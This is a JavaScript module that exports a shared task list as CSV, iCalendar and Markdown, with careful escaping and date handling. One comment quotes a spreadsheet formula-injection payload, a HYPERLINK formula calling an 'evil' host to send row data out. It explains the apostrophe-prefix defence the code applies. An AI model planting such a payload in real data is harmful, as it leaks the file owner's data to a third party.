// ======== SHARE EXPORT ========
// ONE serializer for the public share's task list, rendered to every export
// surface: CSV, iCalendar, and Markdown. Follows `one-projection-many-surfaces`:
// `buildPublicTodoShare` (routes/social-todo.js) already owns the row -> task
// projection, so nothing here re-derives a task from a block. These functions take
// the SAME `task` objects the share payload publishes and only choose how to spell
// them.
//
// That is the whole point. The export lane has three formats and two callers
// (the browser download, which serializes exactly the filtered rows on screen,
// and the server endpoint, which serializes a plain day for a link) = six chances
// to hand-roll a narrower field list and silently drop `detail` or `tags` from one
// of them. There is one field list, in `TASK_COLUMNS`, and every format reads it.
//
//   toCsv(tasks, meta)      -> RFC 4180 text
//   toIcs(tasks, meta)      -> RFC 5545 VCALENDAR text
//   toMarkdown(tasks, meta) -> Markdown text (paste target: Google Docs)
//   filenameFor(meta, ext)  -> "drake-2026-08-19.csv"
//   mimeFor(format)         -> the Content-Type for the format
//
// PURE, by the same rule task-model.js keeps: no globals mutated, nothing read off
// the page, no I/O, no Date.now() except through `meta.now`. That is what lets
// share-export.test.js require() it under node and lets the server call it.
//
// Browser: exposes window.DCC.ShareExport. Node: require()d by the route + tests.
// UMD wrapper matches task-model.js / task-serialize.js.
(function (root, factory) {
  const api = factory();
  if (typeof module === "object" && module.exports) module.exports = api;
  if (root) {
    const DCC = (root.DCC = root.DCC || {});
    DCC.ShareExport = api;
  }
})(typeof self !== "undefined" ? self : this, function () {
  "use strict";

  const FORMATS = ["csv", "ics", "md"];

  // The one field list. A format that wants another column adds it HERE, so the
  // other two formats get it in the same commit or consciously skip it.
  const TASK_COLUMNS = [
    { key: "date",        label: "Date",         get: (t, m) => t.date || m.date || "" },
    { key: "start",       label: "Start",        get: (t) => t.start || "" },
    { key: "end",         label: "End",          get: (t) => t.end || "" },
    { key: "duration",    label: "Duration (min)", get: (t) => (t.durationMinutes ? String(t.durationMinutes) : "") },
    { key: "title",       label: "Title",        get: (t) => t.title || "" },
    { key: "type",        label: "Type",         get: (t) => t.itemTypeLabel || t.itemType || "" },
    { key: "status",      label: "Status",       get: (t) => t.status || "" },
    { key: "priority",    label: "Priority",     get: (t) => t.priority || "" },
    { key: "points",      label: "Points",       get: (t) => (t.points == null ? "" : String(t.points)) },
    { key: "calendar",    label: "Calendar",     get: (t) => (t.calendar && t.calendar.name) || "" },
    { key: "tags",        label: "Tags",         get: (t) => (Array.isArray(t.tags) ? t.tags.map(x => (x && x.name) || "").filter(Boolean).join(", ") : "") },
    { key: "notes",       label: "Notes",        get: (t) => t.detail || "" },
    { key: "addedByGuest", label: "Added by guest", get: (t) => (t.createdByGuest ? "yes" : "") }
  ];

  function str(v) { return v == null ? "" : String(v); }

  // Columns each format already spells STRUCTURALLY, so repeating them as
  // "Label: value" filler would be noise. DECLARED here rather than passed at the
  // call site, so "is this format allowed to omit that column" has one answer a
  // test can read: every column not listed for a format MUST appear in it.
  const STRUCTURAL_KEYS = ["date", "start", "end", "duration", "title", "notes"];
  const STRUCTURAL_BY_FORMAT = {
    csv: [],                                  // a flat row spells every column
    ics: STRUCTURAL_KEYS,                     // DTSTART/DTEND/SUMMARY/DESCRIPTION
    // Markdown adds `status`: the checkbox IS the status, so "Status: open"
    // under a "- [ ]" bullet is the same fact twice.
    md: STRUCTURAL_KEYS.concat(["status"])
  };
  const COLUMN_BY_KEY = TASK_COLUMNS.reduce((acc, c) => { acc[c.key] = c; return acc; }, {});

  function field(task, m, key) {
    const column = COLUMN_BY_KEY[key];
    return column ? str(column.get(task, m)) : "";
  }

  // Every non-structural column, as "Label: value" lines. This is what makes the
  // one-field-list promise at the top of this file TRUE rather than aspirational:
  // before it existed only toCsv read TASK_COLUMNS, so ICS silently dropped
  // priority/points/tags/addedByGuest and Markdown dropped those plus
  // type/calendar. A column added to the list now reaches all three formats.
  function extraLines(task, m, format) {
    const skip = STRUCTURAL_BY_FORMAT[format] || STRUCTURAL_KEYS;
    return TASK_COLUMNS
      .filter(c => skip.indexOf(c.key) === -1)
      .map(c => [c.label, str(c.get(task, m))])
      .filter(pair => pair[1])
      .map(pair => pair[0] + ": " + pair[1]);
  }

  function normalizeMeta(meta) {
    const m = meta || {};
    return {
      owner: str(m.owner || m.ownerUsername || "").trim(),
      workspaceName: str(m.workspaceName || "").trim(),
      date: str(m.date || "").trim(),
      from: str(m.from || m.date || "").trim(),
      to: str(m.to || m.date || "").trim(),
      url: str(m.url || "").trim(),
      // Injected so the output is deterministic under test. Never read the clock
      // directly: an ICS DTSTAMP that moves every run is untestable.
      now: m.now instanceof Date ? m.now : (m.now ? new Date(m.now) : new Date())
    };
  }

  function rangeLabel(m) {
    if (m.from && m.to && m.from !== m.to) return m.from + " to " + m.to;
    return m.date || m.from || "";
  }

  // ── CSV (RFC 4180) ───────────────────────────────────────────────────────────
  // Quote when the value holds a comma, quote, CR or LF; double interior quotes.
  // CRLF row terminator, which is what the RFC says and what Excel wants.
  function csvCell(value) {
    let s = str(value);
    // FORMULA INJECTION. Excel and Sheets execute a cell that opens with = + - @
    // (or a leading tab/CR), so `=HYPERLINK("https://evil/?"&A1,"click")` in a
    // task title exfiltrates the row the moment the owner opens the file. That is
    // reachable by anyone holding the share link: the guest task POST stores
    // `title` and `note` with no character filtering at all, and those land in
    // the Title and Notes columns. A leading apostrophe forces the cell to text.
    // Quoting alone does NOT help — Excel strips the quotes and evaluates.
    if (/^[=+\-@\t\r]/.test(s)) s = "'" + s;
    if (!/[",\r\n]/.test(s)) return s;
    return '"' + s.replace(/"/g, '""') + '"';
  }

  function toCsv(tasks, meta) {
    const m = normalizeMeta(meta);
    const rows = [TASK_COLUMNS.map(c => csvCell(c.label)).join(",")];
    for (const task of (tasks || [])) {
      if (!task) continue;
      rows.push(TASK_COLUMNS.map(c => csvCell(c.get(task, m))).join(","));
    }
    return rows.join("\r\n") + "\r\n";
  }

  // ── iCalendar (RFC 5545) ─────────────────────────────────────────────────────
  // Every task becomes a VEVENT, not a VTODO. VTODO is the semantically nicer
  // match and Google Calendar silently DROPS it, which would make the single most
  // likely destination for this file import an empty calendar. A timed task gets
  // a floating (no Z, no TZID) DTSTART/DTEND so it lands at the same wall-clock
  // time in the importer's own zone; an untimed task becomes an all-day event on
  // its date.
  function icsEscape(value) {
    return str(value)
      .replace(/\\/g, "\\\\")
      .replace(/;/g, "\\;")
      .replace(/,/g, "\\,")
      // A LONE \r used to survive `\r?\n`. RFC 5545 forbids control characters in
      // TEXT values, and a lenient parser that splits on bare CR would read the
      // rest of a SUMMARY as a new content line, letting guest-supplied task text
      // choose its own iCalendar properties. Guest titles are only trimmed
      // upstream, so nothing else filters an interior control character.
      .replace(/\r\n|\r|\n/g, "\\n")
      .replace(/[\x00-\x08\x0B\x0C\x0E-\x1F\x7F]/g, "");
  }

  // UTF-8 size of one code point, computed rather than measured: this file is
  // pure and has to give the same answer under node and in the browser.
  function utf8Size(codePoint) {
    if (codePoint < 0x80) return 1;
    if (codePoint < 0x800) return 2;
    if (codePoint < 0x10000) return 3;
    return 4;
  }

  // Fold at 75 OCTETS, not characters. Iterating with for..of walks CODE POINTS,
  // so an emoji in a task title is never split down the middle of its surrogate
  // pair (which would be a corrupt file, and a title with an emoji in it is not
  // an edge case here). Continuation lines start with one space, and that space
  // counts against the next line's 75.
  function foldLine(line) {
    const text = str(line);
    const out = [];
    let current = "";
    let used = 0;
    for (const ch of text) {
      const size = utf8Size(ch.codePointAt(0));
      if (used + size > 75) {
        out.push(current);
        current = " " + ch;
        used = 1 + size;
      } else {
        current += ch;
        used += size;
      }
    }
    out.push(current);
    return out.join("\r\n");
  }

  function pad2(n) { return (n < 10 ? "0" : "") + n; }

  function utcStamp(date) {
    return date.getUTCFullYear()
      + pad2(date.getUTCMonth() + 1)
      + pad2(date.getUTCDate()) + "T"
      + pad2(date.getUTCHours())
      + pad2(date.getUTCMinutes())
      + pad2(date.getUTCSeconds()) + "Z";
  }

  function dateCompact(dateStr) { return str(dateStr).replace(/-/g, ""); }

  function nextDayCompact(dateStr) {
    const parts = str(dateStr).split("-").map(Number);
    if (parts.length !== 3 || parts.some(isNaN)) return dateCompact(dateStr);
    const d = new Date(Date.UTC(parts[0], parts[1] - 1, parts[2]));
    d.setUTCDate(d.getUTCDate() + 1);
    return d.getUTCFullYear() + pad2(d.getUTCMonth() + 1) + pad2(d.getUTCDate());
  }

  function timeCompact(hhmm) {
    const match = /^(\d{1,2}):(\d{2})/.exec(str(hhmm));
    if (!match) return null;
    return pad2(Number(match[1])) + pad2(Number(match[2])) + "00";
  }

  // A task with a start and no end still deserves a real DTEND: an importer given
  // a zero-length event renders a sliver nobody can click.
  //
  // Returns { date, time } rather than a bare time, so DTEND can legally land on
  // the NEXT day. The first cut clamped to 23:59 instead, which broke three
  // end-of-day cases, all silently (the file imports, it is just not the day the
  // owner had):
  //   - `end: "24:00"` passed straight through as hour 24, which RFC 5545 does
  //     not allow (hour is 00-23). Reachable today: route-helpers.js clamps a
  //     derived end with `Math.min(24 * 60, ...)`, so a 23:30 quick-task with a
  //     60m duration stores literally "24:00".
  //   - A task crossing midnight (23:00 -> 00:30) failed the `explicit > start`
  //     STRING compare, fell through to duration, and clamped: 31 minutes lost.
  //   - 23:59 + 30m clamped to 23:59, producing DTEND === DTSTART: exactly the
  //     zero-length event this function exists to prevent.
  function endTimeFor(task, date) {
    const start = timeCompact(task.start);
    if (!start) return null;
    const startMinutes = Number(start.slice(0, 2)) * 60 + Number(start.slice(2, 4));
    const explicit = timeCompact(task.end);
    let endMinutes;
    if (explicit) {
      endMinutes = Number(explicit.slice(0, 2)) * 60 + Number(explicit.slice(2, 4));
      // "24:00" and a genuine midnight crossing both mean "tomorrow".
      if (endMinutes <= startMinutes) endMinutes += 24 * 60;
    } else {
      endMinutes = startMinutes + (Number(task.durationMinutes) || 30);
    }
    const rollsOver = endMinutes >= 24 * 60;
    const mins = endMinutes % (24 * 60);
    return {
      date: rollsOver ? nextDayCompact(date) : dateCompact(date),
      time: pad2(Math.floor(mins / 60)) + pad2(mins % 60) + "00"
    };
  }

  function icsUid(task, m, index) {
    const base = str(task.id || task.blockId || ("row-" + index)).replace(/[^A-Za-z0-9._-]/g, "");
    return (base || "row-" + index) + "-" + dateCompact(task.date || m.date || m.from) + "@daily-command-center";
  }

  function toIcs(tasks, meta) {
    const m = normalizeMeta(meta);
    const stamp = utcStamp(m.now);
    const calName = (m.workspaceName || (m.owner ? m.owner + "'s list" : "Shared list"))
      + (rangeLabel(m) ? " " + rangeLabel(m) : "");
    const lines = [
      "BEGIN:VCALENDAR",
      "VERSION:2.0",
      "PRODID:-//Daily Command Center//Share Export//EN",
      "CALSCALE:GREGORIAN",
      "METHOD:PUBLISH",
      "X-WR-CALNAME:" + icsEscape(calName)
    ];
    (tasks || []).forEach((task, index) => {
      if (!task || !task.title) return;
      const date = str(task.date || m.date || m.from);
      if (!date) return;
      const start = timeCompact(task.start);
      lines.push("BEGIN:VEVENT");
      lines.push("UID:" + icsUid(task, m, index));
      lines.push("DTSTAMP:" + stamp);
      if (start) {
        const end = endTimeFor(task, date);
        lines.push("DTSTART:" + dateCompact(date) + "T" + start);
        lines.push("DTEND:" + end.date + "T" + end.time);
      } else {
        lines.push("DTSTART;VALUE=DATE:" + dateCompact(date));
        lines.push("DTEND;VALUE=DATE:" + nextDayCompact(date));
      }
      lines.push("SUMMARY:" + icsEscape(field(task, m, "title")));
      const description = [];
      const notes = field(task, m, "notes");
      if (notes) description.push(notes);
      // Every remaining column, from the one list, so nothing is dropped here
      // that the CSV carries.
      description.push(...extraLines(task, m, "ics"));
      if (m.url) description.push(m.url);
      if (description.length) lines.push("DESCRIPTION:" + icsEscape(description.join("\n")));
      if (task.calendar && task.calendar.name) lines.push("CATEGORIES:" + icsEscape(task.calendar.name));
      // A finished task imports as CONFIRMED-but-done rather than vanishing, so a
      // day exported after the fact still reads as a record of what happened.
      lines.push("STATUS:" + (task.status === "done" ? "CONFIRMED" : "TENTATIVE"));
      if (task.status === "done") lines.push("X-DCC-COMPLETED:TRUE");
      lines.push("END:VEVENT");
    });
    lines.push("END:VCALENDAR");
    return lines.map(foldLine).join("\r\n") + "\r\n";
  }

  // ── Markdown ─────────────────────────────────────────────────────────────────
  // Paste target is a Google Doc, so this leans on headings + checkbox lists,
  // which paste as real structure, and avoids tables, which do not.
  function mdEscape(value) {
    return str(value).replace(/([*_`[\]])/g, "\\$1");
  }

  // A newline inside a value ends the list item it sits in: the second line
  // renders as a top-level paragraph and every following task falls out of the
  // list. Caught by exporting a real guest-submitted note, which is exactly where
  // multi-line text comes from. Titles collapse to one line; notes keep their
  // lines and become one nested bullet each, so nothing is lost.
  function mdOneLine(value) {
    return mdEscape(str(value).replace(/\s*\r?\n\s*/g, " ")).trim();
  }

  function mdNoteLines(value) {
    return str(value).split(/\r?\n/).map(line => mdEscape(line).trim()).filter(Boolean);
  }

  function mdTimeLabel(task) {
    if (task.start && task.end) return task.start + "-" + task.end;
    if (task.start) return task.start;
    if (task.durationMinutes) return task.durationMinutes + "m";
    return "";
  }

  function toMarkdown(tasks, meta) {
    const m = normalizeMeta(meta);
    const list = (tasks || []).filter(t => t && t.title);
    const title = m.workspaceName || (m.owner ? m.owner + "'s list" : "Shared list");
    const out = ["# " + mdEscape(title)];
    const label = rangeLabel(m);
    if (label) out.push("", "*" + label + "*");

    const open = list.filter(t => t.status !== "done");
    const done = list.filter(t => t.status === "done");
    // A RANGE export carried no date at all: toMarkdown never read task.date, so
    // 31 days collapsed into one undifferentiated list under a range subtitle,
    // with no way to tell which day anything belonged to. CSV and ICS both got
    // this right, which is exactly the cross-format drift the one-field-list is
    // supposed to prevent. Group by day when the export spans more than one.
    const multiDay = !!(m.from && m.to && m.from !== m.to);

    const bullet = (task, checked) => {
      const time = mdTimeLabel(task);
      out.push("- [" + (checked ? "x" : " ") + "] "
        + (time ? "**" + time + "** " : "")
        + mdOneLine(field(task, m, "title"))
        + (task.durationMinutes && time !== task.durationMinutes + "m" ? " (" + task.durationMinutes + "m)" : ""));
      for (const line of mdNoteLines(field(task, m, "notes"))) out.push("  - " + line);
      for (const line of extraLines(task, m, "md")) out.push("  - " + line);
    };

    const section = (heading, rows, checked) => {
      if (!rows.length) return;
      out.push("", "## " + heading, "");
      if (!multiDay) {
        for (const task of rows) bullet(task, checked);
        return;
      }
      const byDate = new Map();
      for (const task of rows) {
        const key = str(task.date || m.date || m.from);
        if (!byDate.has(key)) byDate.set(key, []);
        byDate.get(key).push(task);
      }
      for (const key of [...byDate.keys()].sort()) {
        out.push("### " + key, "");
        for (const task of byDate.get(key)) bullet(task, checked);
        out.push("");
      }
    };

    section("Open", open, false);
    section("Done", done, true);
    if (!list.length) out.push("", "*Nothing on this list yet.*");
    if (m.url) out.push("", "---", "", "Live list: " + m.url);
    return out.join("\n") + "\n";
  }

  // ── Naming + content types ───────────────────────────────────────────────────
  function slugify(value, fallback) {
    const slug = str(value).toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-+|-+$/g, "").slice(0, 40);
    return slug || fallback;
  }

  function filenameFor(meta, ext) {
    const m = normalizeMeta(meta);
    const who = slugify(m.workspaceName || m.owner, "shared-list");
    const when = (m.from && m.to && m.from !== m.to) ? m.from + "_" + m.to : (m.date || m.from || "list");
    return who + "-" + when + "." + str(ext).replace(/^\./, "");
  }

  const MIME = {
    csv: "text/csv; charset=utf-8",
    ics: "text/calendar; charset=utf-8",
    md: "text/markdown; charset=utf-8"
  };

  function mimeFor(format) { return MIME[str(format).toLowerCase()] || "text/plain; charset=utf-8"; }

  function isFormat(format) { return FORMATS.indexOf(str(format).toLowerCase()) !== -1; }

  function serialize(format, tasks, meta) {
    const key = str(format).toLowerCase();
    if (key === "csv") return toCsv(tasks, meta);
    if (key === "ics") return toIcs(tasks, meta);
    if (key === "md") return toMarkdown(tasks, meta);
    const err = new Error("unsupported export format");
    err.statusCode = 400;
    throw err;
  }

  return {
    FORMATS: FORMATS,
    TASK_COLUMNS: TASK_COLUMNS,
    STRUCTURAL_BY_FORMAT: STRUCTURAL_BY_FORMAT,
    toCsv: toCsv,
    toIcs: toIcs,
    toMarkdown: toMarkdown,
    serialize: serialize,
    filenameFor: filenameFor,
    mimeFor: mimeFor,
    isFormat: isFormat,
    // exported for the tests that pin the escaping rules
    _csvCell: csvCell,
    _icsEscape: icsEscape,
    _foldLine: foldLine
  };
});
